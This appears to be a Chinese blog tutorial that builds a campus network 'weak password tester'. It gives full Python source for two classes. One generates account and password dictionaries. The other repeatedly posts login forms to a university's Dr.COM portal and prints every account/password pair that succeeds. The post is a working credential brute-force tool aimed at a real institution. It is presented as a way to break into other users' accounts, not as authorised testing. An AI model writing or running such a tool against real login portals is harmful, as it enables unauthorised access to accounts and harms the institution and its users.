# 校园网弱密码测试器
> 基于上一篇校园网脚本一键登录

在上一篇中, 我们成功地通过 Python 使用帐号和密码登录了校园网, 试想一下, 假如我有很多帐号, 有密码字典, 那岂不是可以暴力穷举帐号的弱密码了吗?

首先, 先确定提交表单的 URL 是全校通用的, 是手机和电脑全平台适用的, 分别在不同的装有 AC 面板的地方连上 wifi, 测试登录脚本 (确定 ACname 和 ACip 唯一), 分别使用不同的手机电脑测试 (确定 ip 是通过 DHCP 分配), 确定下来之后就开始编写脚本了, 首先项目分为两部分, 一部分负责提供帐号密码 (account-password), 称为 APManager, 一部分负责登录验证, 称为 Snipper, 于是我们就有了两个类, 分别对其进行函数填充.

`APManager` 主要变量有 `account_list`, 一个存储着所有帐号的 list;`account_index`, 一个指向 list 的当前下标, 每次测试登录之后, index 都会前移, 同理还有 `password_list` 和 `password_index`, 然后有个 `generate_account` 函数负责按照一定规律 (固定前缀 / 递增) 生成 account 并保存在 `accounts.txt` 中, 和生成密码字典的 `generate_password`, 获得下一个 account/password 的 `next_account` 和 `next_password`, 每次获取时都会先调用 generate_account/password, 检查下标是否越界, 获得下一个 account/password, 或者返回 `None`, 还有个 `reset_password`, 用来将 `password_index` 归零, 因为 `account_list` 中的每一个 account 都要用到 `password_list` 中每一项, 所以需要归零, 而 `account_index` 不需要归零, 因为一旦测试完了所有的 account, 脚本也就运行结束了, 最后一个函数是 `read_file`, 负责从文件中读取 account 和 password 组成两个 list.

`Snipper` 主要变量有 `APManager` 和 `URL`, 主要函数有: `contract`, 负责将 account 和 password(从 `APManager` 中 `next_account` 和 `next_password` 函数获得) 拼接起来组成表单; `snip`, 负责发起登录请求和结果判断; `shedule`, 负责调度 `APManager` 产生 account/password 和 `snip`

两个类的代码如下:
`APManager.py`
```
# encoding = utf-8
# /usr/bin/python


class APManager():
	"""docstring for APManager"""

	def __init__(self):
		self.account_index = 0
		self.password_index = 0
		self.account_list = []
		self.password_list = []

	def generate_accounts(self):
		"""generate a series of accounts and save to a txt file"""
		accounts = ['1','2','3','4']
		file = open('accounts.txt','w')
		for account in accounts:
			file.write('%s\n' %account)
		file.close()
		print 'generate accounts success'

	def generate_passwords(self):
		"""generate a series of passwords and save to a txt file"""
		passwords = ['1','2','3','6']
		file = open('passwords.txt','w')
		for password in passwords:
			file.write('%s\n' %password)
		file.close()
		print 'generate passwords success'

	def next_account(self):
		self.read_file()
		if self.account_index <len(self.account_list):
			account = self.account_list[self.account_index]
			self.account_index += 1
			print 'next account is %s' %account
			return account
		else:
			print 'no more account'
			return None

	def next_password(self):
		self.read_file()
		if self.password_index <len(self.password_list):
			password = self.password_list[self.password_index]
			self.password_index += 1
			print 'next password is %s' %password
			return password
		else:
			print 'no more password'
			return None			

	def reset_password(self):
		self.password_index = 0

	def read_file(self):
		"""read account and password from txt and save to 2 list"""
		with open('accounts.txt','r') as f:
			lines = f.readlines()
		self.account_list = [line.strip() for line in lines]

		with open('passwords.txt','r') as f:
			lines = f.readlines()
		self.password_list = [line.strip() for line in lines]

		# print self.account_list
		# print self.password_list

if __name__ == '__main__':
	manager = APManager()
	# manager.generate_accounts()
	# manager.generate_passwords()
	account = manager.next_account()
	print account
	password = manager.next_password()
	print password
```
`Snipper.py`
```
# encoding=utf-8
# /usr/bin/python
import urllib2,urllib
import re
import time,sched
from APManager import APManager

class Snipper(object):
	"""docstring for Snipper"""

	def __init__(self):
		self.url = 'https://s.XXXX.edu.cn:801/eportal/?c=ACSetting&a=Login&wlanuserip=192.168.165.193&wlanacip=192.168.255.251&wlanacname=WX6108E-slot5-AC&redirect=&session=&vlanid=XXXX-student&port=80&iTermType=&protocol=https:'
		self.manager = APManager()

	def contract(self,account,password):
		data = urllib.urlencode([('DDDDD', account),
  ('upass', password),
  ('R1', '0'),
  ('R2', ''),
  ('R6', '0'),
  ('para', '00'),
  ('0MKKey', '123456')])
		return data

	def snip(self,account,password):
		data = self.contract(account,password)
		req = urllib2.Request (self.url,data)
		response = urllib2.urlopen(req)
		html = response.read().decode('gb2312')
		# print html
		p = r"<title>(.+?)</title>"
		macher = re.findall(p,html)
		title = ''.join(macher)
		# Drcom PC 登陆信息页
		# Drcom PC 登陆成功页
		# print title
		# print type(title)
		if title == u'Drcom PC 登陆信息页':
			print 'error'
			return False
		elif title == u'Drcom PC 登陆成功页':
			print 'success'
			print account
			print password
			return True
		else:
			print 'unknown error'
			return False

	def schedule(self):
		account = self.manager.next_account()
		password = self.manager.next_password()
		while account is not None:
			if self.snip(account,password):
				account = self.manager.next_account()
			else:
				next_password = self.manager.next_password()
				password = next_password
				if next_password is None:
					self.manager.reset_password()
					password = self.manager.next_password()
					account = self.manager.next_account()


if __name__ == '__main__':
	snipper = Snipper()
	snipper.schedule()
```
